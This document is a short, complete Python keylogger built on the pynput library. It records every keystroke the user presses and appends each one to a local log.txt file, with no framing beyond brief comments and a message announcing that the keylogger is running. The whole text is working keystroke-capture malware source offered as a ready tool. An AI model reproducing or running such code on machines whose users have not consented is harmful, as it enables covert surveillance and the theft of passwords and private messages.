from pynput.keyboard import Listener

#Logging all keystrokes by the user, and make the key format cleaner
def log_keystroke(key):
    key = str(key).replace("'", "")
    with open("log.txt","a") as log_file:
        log_file.write(key + "\n")

#listen to keystrokes by the user
def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger is running... (CTRL + C to stop)")
    start_logging()
